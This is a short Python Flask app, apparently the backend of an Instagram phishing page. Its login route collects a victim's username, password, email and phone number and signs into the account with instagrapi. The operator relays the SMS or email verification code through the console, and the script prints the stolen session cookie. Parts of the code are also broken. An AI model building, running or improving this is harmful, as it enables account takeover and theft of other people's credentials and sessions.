from flask import Flask, request, render_template, redirect, url_for
from instagrapi import Client
from instagrapi.mixins.challenge import ChallengeChoice
app = Flask(__name__)


def get_code_from_sms():
    while True:
        code = input(f"Enter code (6 digits) for  SMS: ").strip()
        if code and code.isdigit():
            return code
    return None

def get_code_from_email():
    while True:
        code = input(f"Enter code (6 digits) for  MAIL: ").strip()
        if code and code.isdigit():
            return code
    return None

def challenge_code_handler(username, choice):
    if choice == ChallengeChoice.SMS:
        return get_code_from_sms()
    elif choice == ChallengeChoice.EMAIL:
        return get_code_from_email()
    return False


@app.route('/code')
def code():
    render_template('index.html')
    




@app.route('/')
def index():
    return render_template('index.html')
    

@app.route('/info', methods=['POST'])
def sonuc():
    sesion_id = request.form['username']
    return render_template('info.html', username=sesion_id)


@app.route('/login', methods=['POST'])
def login():
    aliu=request.form['username']
    alip=request.form['pass']
    alim=request.form['mail']
    alin=request.form['number']
    
    try:
        cl=Client()
        print("Giriş Yapılıyor")
        ahmetkaya= challenge_code_handler
        cl.challenge_code_handler =   ahmetkaya
        cl.login(aliu,str(alip))       
        print("giriş yapıldı")
        print("ametkaya: "+str(code))
        kaya= cl.sessionid
        print("Coocies budur=  "+str(kaya))
        print(str(aliu))
        return render_template('index.html')
        
    except:
        print("hata var")
        return  render_template('info.html')






if __name__ == '__main__':
    app.run(debug=True)